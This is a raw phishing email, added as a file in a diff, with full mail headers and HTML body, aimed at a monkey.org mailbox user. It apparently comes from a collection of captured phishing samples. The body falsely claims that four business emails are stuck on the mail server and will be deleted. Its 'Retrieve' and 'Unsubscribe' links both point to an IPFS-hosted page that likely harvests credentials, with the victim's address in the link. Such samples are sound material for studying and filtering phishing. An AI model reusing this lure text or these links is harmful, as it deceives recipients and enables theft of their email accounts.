@@ -1,0 +1,298 @@
+Return-Path: mail@bc0.net
+Delivered-To: jose@monkey.org
+X-FDA: 82608229494.20.7E8051A
+Received: from bc0.net (unknown [31.192.235.68])
+	by imf28.b.hostedemail.com (Postfix) with ESMTP id AFD46100005
+	for <jose@monkey.org>; Thu, 26 Sep 2024 21:48:45 +0000 (UTC)
+Authentication-Results: imf28.b.hostedemail.com;	dkim=fail ("headers rsa
+ verify failed") header.d=bc0.net header.s=dkim header.b=ommNHGz2;	dmarc=pass
+ (policy=reject) header.from=bc0.net;	spf=pass (imf28.b.hostedemail.com:
+ domain of mail@bc0.net designates 31.192.235.68 as permitted sender)
+ smtp.mailfrom=mail@bc0.net
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1727387233; a=rsa-sha256;
+	cv=none;
+	b=6aDZQRJs/xPKE/7jCtuPcfQ/GjLC64WDPj9t5FWSOv12/NRf8OP5UhHvG8p+55G/VctjPT
+	ZPcN9wcQSxTBiKduIZZXOjO5KV5kRAItci06+sbQaZIKGF/XigsPxW2XIqHRsysxVtf5Op
+	Bai18oQ4a2Hm3OAvUN0mG5zO61q1PBg=
+ARC-Authentication-Results: i=1;	imf28.b.hostedemail.com;	dkim=fail ("headers
+ rsa verify failed") header.d=bc0.net header.s=dkim header.b=ommNHGz2;
+	dmarc=pass (policy=reject) header.from=bc0.net;	spf=pass
+ (imf28.b.hostedemail.com: domain of mail@bc0.net designates 31.192.235.68 as
+ permitted sender) smtp.mailfrom=mail@bc0.net
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1727387233;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=/1sBIY/5IJh+e0J+XR00q7unMOTfT5j5UnJdjbGkngI=;
+	b=NqGh8Lu/Bg1uEpRqihAfEV+AyL8TbyyjWBenwRpIgO2SU3EfCGf0nnbUyUtxZ+DFIqsbVK
+	O8xhJhPVoOEU2mU25pOnOik6gRvYYCk2wKCWn/Fg3FB4X0E3zeTJm/hk6ZD29kQYB/iEhP
+	JSNrfl+md/UhSWo7f1iUx3Yz4RIBkus=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim; d=bc0.net;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=mail@bc0.net;
+ bh=/1sBIY/5IJh+e0J+XR00q7unMOTfT5j5UnJdjbGkngI=; =?utf-8?q?b=3DommNHGz2UUcY?=
+ =?utf-8?q?bFYt9Lwwc/e5yv5TykNE2O9lhXj8rbS9Z3dOMKSjQk/zEK5Cq1EHiG647IhdTK7C?=
+  
+ +0/VtIYKrHISs9bvYXmRIlBxhwe5+rWphGEmHgpXFzhu2Mxi0AL/0DBHHZH2q4CLnP6RPZphy1n8
+  
+ KwfNVWa0q5ze6XBI5lsBfjnBAT+nLjcVLRHQjExjrN8giLWL/GT3+I6bybJAGA0S3oK+Qtk2DgFd
+  
+ T8Tt4F56CmjS2uYtqaLEmqIWRLqdZ8/K4Q/zSKb6tK5gAYhoMc4P9YPdtfP0KeYUXeJ9eE/LTKbR
+   ek1fq83cF58sgl3SaqPKx07KYIuWdsWdew2CRA==
+From: monkey.org <mail@bc0.net>
+To: jose@monkey.org
+Subject: Move Pending Emails To Inbox
+Date: 26 Sep 2024 14:48:42 -0700
+Message-ID: <20240926144842.D4472722001B2CA3@bc0.net>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: AFD46100005
+X-Stat-Signature: ymcfsdbkb4bab7gcz4uwe8iusbtfkwfi
+X-Spam-Status: Yes, score=17.20
+X-Rspam-User: 
+X-HE-Tag: 1727387325-440442
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18IuHYWCd6OXMg+jgJTa4xO/r/z7BhaDY35QBUg+RpZ1Gv?=
+ =?utf-8?q?24kwRuMRzi/qqO5TdWc20GLVMk9UBqQtXQSN+QIUoEoxm0SYULETEjCFbgZ7Ejjz8?=
+ =?utf-8?q?gouDWKYa+6BvZQ8/bkZVyiOw+RuWFE4lWwWOR211LCXBrOS27la1JBX+i+Tx5S9ol?=
+ =?utf-8?q?XLfKgtn/qECrsRKWN6SAoJTfRNp56ZiHJq8SR9W9ZN/bp13qXmCcHIn+mmSuWwpM9?=
+ =?utf-8?q?sef6QjqY899A+0JHDcVE1nx+zxlI7SFfkuSoglpg/0ENW7mvAvWMCSpaa7yVcw1lE?=
+ =?utf-8?q?nCJev+1wlTQ4lH7sbXWuM4fus4B9LtwrYQpTdY4oDTvL1Sz4U1kKpJJ/lzIkSP0cq?=
+ =?utf-8?q?j3s6KXwGmsDJCbnfPq1Ls2Gk5gveLJfxXFhgbnLFl/fDlmAuViuXSypNUwesYby6z?=
+ =?utf-8?q?+9h/pCnhYPStvGiWkhnHG4KP+26fpTd9tAnOPLpiFNjMX+It+T6ePvrOaZQg6XgUz?=
+ =?utf-8?q?a41IRkUbH8k8OCThh4SahB/H2Eis91ROxgvgAvEBs0blxRnD3TnRa9E4sUlB3LWmm?=
+ =?utf-8?q?W2msoMskoC8IlsXZxHKRCG9rhXKpBB3GA+rF9UJ/LW+L2z002jP2POd6tAmWIhNZE?=
+ =?utf-8?q?TXoH7PDO7GRFbNO9mLp+K/wE4F8DU3TREUNi43A/vnO3SBjtLAdLbK8aef/H67dEQ?=
+ =?utf-8?q?H/rEKo2s3gFRQ7qdag5OoQTpOw0jctuuwnv3eRPF5xrKu9WFaD/AX81Cq44CVg6ji?=
+ =?utf-8?q?dauL8ltTcnzOBMCna+5OUQ1TE7vWo3STmMjFXsJfAX/sNmu8lI8BzItDom7pBnekw?=
+ =?utf-8?q?XjcXfJquecHdUclUOe6e1oio3LzPQW5G2gcLw5Gz7yILmsWQ+7jPTjPp9ovOIlhTR?=
+ =?utf-8?q?WV35n7ZGWNczRH+36Ke8o3sLQjAKdwYBc7YZGopyM5Ok6ZUIQaegssNb+WvtWjjiz?=
+ =?utf-8?q?UcaIow4hwmxh0nboONc7Xj_b9JQfw1VYkNqTpyyA0Epih9mNAQhZXiqE8ATihZ1Wc?=
+ =?utf-8?q?h5O1v4vsPXJTWe7CMyzoaJCqX8MKISnIhK2TaNaLWeAB/HHnJc9jALDdi2rucDbdB?=
+ =?utf-8?q?j6ZEllPWTVOlWwx+UE09oPzNcdH49F6/15xuoV71UXGOBZoNddJfZ9FZ9sATB71Y3?=
+ =?utf-8?q?DVp663rf+I0v4BADwQxKKW05PYe8vtzA/MfIK6r/iEbu2jjcpWHsoy1E5ndccY/B3?=
+ =?utf-8?q?camwoMU0cW1NLiBMzwtmjiTgGT4EZ9LkSUVd9JXLQ6DA32+fPsL+dHJrosYrtXeR3?=
+ =?utf-8?q?rv7UnFkQnUpjCUGZaL6Pje976kPqPKrHPMAQBJLHzkUg5qk0c45jFcDUrMJ1CizjQ?=
+ =?utf-8?q?uM0J2/VrEvsBA7kw960ZGsvZ5PXeSJKIoXYDO+nqt5uodvjCo/ZorPwu0/coXwANa?=
+ =?utf-8?q?jGSJDXTltqhLKtic6AWzY8rcbE8/xrKzLTXPQIbAFd/un+XL/uXv3M/O4JTeqeUNn?=
+ =?utf-8?q?7SgTSlou0nsKqIFjRUNoZfR7z88stDk=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 275
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"100%" align=3D"center" style=3D'color: rgb(29, 34, 40); tex=
+t-transform: none; letter-spacing: normal; font-family: "Helvetica Neue", H=
+elvetica, Arial, sans-serif; font-size: 13px; font-style: normal; font-weig=
+ht: 400; word-spacing: 0px; white-space: normal; border-collapse: collapse;=
+ orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color:=20
+initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+  <tbody style=3D"box-sizing: border-box;">
+    <tr style=3D"box-sizing: border-box;">
+      <td style=3D"margin: 0px; -ms-word-break: normal; box-sizing: border-=
+box;">
+        <table width=3D"480" align=3D"left" style=3D"width: 480px; color: r=
+gb(0, 0, 0); margin-left: 60px; border-collapse: collapse; background-color=
+: rgb(249, 247, 247);" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+          <tbody style=3D"box-sizing: border-box;">
+            <tr style=3D"box-sizing: border-box;">
+              <td width=3D"100%" style=3D"border-width: 0px; margin: 0px; p=
+adding-top: 5px; padding-bottom: 5px; vertical-align: top; -ms-word-break: =
+normal; box-sizing: border-box;">
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                  <tbody style=3D"box-sizing: border-box;">
+                    <tr style=3D"box-sizing: border-box;">
+                      <td style=3D"margin: 0px; padding-top: 10px; padding-=
+bottom: 5px; -ms-word-break: normal; box-sizing: border-box;">
+                        <div style=3D"font-family: sans-serif; box-sizing: =
+border-box;">
+                          <div style=3D"color: rgb(57, 61, 71); line-height=
+: 1.5; font-family: Tahoma, Verdana, Segoe, sans-serif; font-size: 14px; bo=
+x-sizing: border-box;">
+                            <p style=3D"margin: 0px; text-align: center; bo=
+x-sizing: border-box;">
+                              <span style=3D"font-size: 18px; box-sizing: b=
+order-box;">Pending (4) Incoming Emails</span>
+                            </p>
+                          </div>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"10">
+                  <tbody style=3D"box-sizing: border-box;">
+                    <tr style=3D"box-sizing: border-box;">
+                      <td style=3D"margin: 0px; -ms-word-break: normal; box=
+-sizing: border-box;">
+                        <div align=3D"center" style=3D"box-sizing: border-b=
+ox;">
+                          <table width=3D"100%" style=3D"border-collapse: c=
+ollapse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                            <tbody style=3D"box-sizing: border-box;">
+                              <tr style=3D"box-sizing: border-box;">
+                                <td style=3D"margin: 0px; line-height: 1px;=
+ font-size: 1px; border-top-color: rgb(187, 187, 187); border-top-width: 2p=
+x; border-top-style: solid; -ms-word-break: normal; box-sizing: border-box;=
+"></td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                  <tbody style=3D"box-sizing: border-box;">
+                    <tr style=3D"box-sizing: border-box;">
+                      <td style=3D"margin: 0px; padding: 15px 20px 15px 15p=
+x; -ms-word-break: normal; box-sizing: border-box;">
+                        <div style=3D"font-family: Tahoma, Verdana, sans-se=
+rif; box-sizing: border-box;">
+                          <div style=3D"color: rgb(57, 61, 71); line-height=
+: 1.5; font-family: Tahoma, Verdana, Segoe, sans-serif; font-size: 12px; bo=
+x-sizing: border-box;">
+                            <p style=3D"margin: 0px; text-align: center; fo=
+nt-size: 13px; box-sizing: border-box;">&nbsp;</p>
+                            <p align=3D"left" style=3D"margin: 0px; text-al=
+ign: center; font-size: 13px; box-sizing: border-box;">Your 4 important inc=
+oming emails are stuck on monkey.org&nbsp;Email server.
+                              <br>
+                              <br>Email Subject : Quotation
+                              <br>&nbsp; Email Subject : Send Banking Detai=
+ls=20
+                              <br>&nbsp;&nbsp;&nbsp; Email Subject : Re Sig=
+ned Proforma Invoice.pdf
+                              <br>Email Subject : Shipping Documents
+                              <br style=3D"box-sizing: border-box;">
+                            </p>
+                            <p style=3D"margin: 0px; text-align: center; fo=
+nt-size: 13px; box-sizing: border-box;">
+                              <br style=3D"box-sizing: border-box;">A syste=
+m error occurred at
+                              <span style=3D"box-sizing: border-box;">&nbsp=
+;</span>
+                              <span style=3D"font-weight: bolder; box-sizin=
+g: border-box;">22:00HRS.</span>=20
+                              <br style=3D"box-sizing: border-box;">
+                              <br style=3D"box-sizing: border-box;">You can=
+ retrieve the 4 stuck emails with the button below.
+                              <br style=3D"box-sizing: border-box;">
+                              <br style=3D"box-sizing: border-box;">
+                            </p>
+                            <p style=3D"margin: 0px; text-align: center; fo=
+nt-size: 13px; box-sizing: border-box;">Stuck emails will be deleted automa=
+tically from the system.</p>
+                          </div>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"10">
+                  <tbody style=3D"box-sizing: border-box;">
+                    <tr style=3D"box-sizing: border-box;">
+                      <td style=3D"margin: 0px; -ms-word-break: normal; box=
+-sizing: border-box;">
+                        <div align=3D"center" style=3D"box-sizing: border-b=
+ox;">
+                          <a style=3D"border-radius: 4px; border: 1px solid=
+ rgb(138, 59, 143); border-image: none; width: auto; color: rgb(255, 255, 2=
+55); padding-top: 5px; padding-bottom: 5px; font-family: Tahoma, Verdana, S=
+egoe, sans-serif; display: inline-block; box-sizing: border-box; background=
+-color: rgb(0, 2, 165); text-decoration-line: none;" href=3D"https://ipfs.i=
+o/ipfs/QmaK1EE7aELrDa9uwypTdevCfwgjFbEXaJxQbMvdkwqNG7#jose@monkey.org" targ=
+et=3D"_blank" rel=3D"noopener noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://bafkreibcr5r=
+uzi35flvozxnmelzvsys3iiqvedgfgidijdtsanocpqupoy.ipfs.dweb.link/?%23middle.e=
+ast@masteritaly.com&amp;source=3Dgmail&amp;ust=3D1695189820800000&amp;usg=
+=3DAOvVaw0XCkUA7ijO44FFiD1JzA4w">
+                            <span style=3D"padding-right: 20px; padding-lef=
+t: 20px; display: inline-block; box-sizing: border-box;">
+                              <span style=3D"line-height: 1.2; font-size: 1=
+6px; box-sizing: border-box;">
+                                <span style=3D"line-height: 19px; font-size=
+: 13px; box-sizing: border-box;">Retrieve 4 Emails Here</span>
+                              </span>
+                            </span>
+                          </a>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"10">
+                  <tbody style=3D"box-sizing: border-box;">
+                    <tr style=3D"box-sizing: border-box;">
+                      <td style=3D"margin: 0px; -ms-word-break: normal; box=
+-sizing: border-box;">
+                        <div align=3D"center" style=3D"box-sizing: border-b=
+ox;">
+                          <table width=3D"100%" style=3D"border-collapse: c=
+ollapse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                            <tbody style=3D"box-sizing: border-box;">
+                              <tr style=3D"box-sizing: border-box;">
+                                <td style=3D"margin: 0px; line-height: 1px;=
+ font-size: 1px; border-top-color: rgb(187, 187, 187); border-top-width: 2p=
+x; border-top-style: solid; -ms-word-break: normal; box-sizing: border-box;=
+"></td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <table width=3D"100%" style=3D"border-collapse: collapse;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"10">
+                  <tbody style=3D"box-sizing: border-box;">
+                    <tr style=3D"box-sizing: border-box;">
+                      <td style=3D"margin: 0px; -ms-word-break: normal; box=
+-sizing: border-box;">
+                        <div style=3D"font-family: sans-serif; box-sizing: =
+border-box;">
+                          <div style=3D"color: rgb(57, 61, 71); line-height=
+: 1.2; font-family: Tahoma, Verdana, Segoe, sans-serif; font-size: 14px; bo=
+x-sizing: border-box;">
+                            <p style=3D"margin: 0px; text-align: center; bo=
+x-sizing: border-box;">
+                              <span style=3D"font-size: 13px; box-sizing: b=
+order-box;">Email is strictly for the attention of&nbsp; jose@monkey.org
+                                <br>
+                                <a href=3D"https://ipfs.io/ipfs/QmaK1EE7aEL=
+rDa9uwypTdevCfwgjFbEXaJxQbMvdkwqNG7#jose@monkey.org">Unsubscribe Here</a>
+                                <br>
+                              </span>
+                            </p>
+                          </div>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </td>
+    </tr>
+  </tbody>
+</table>
+</body></html>
+
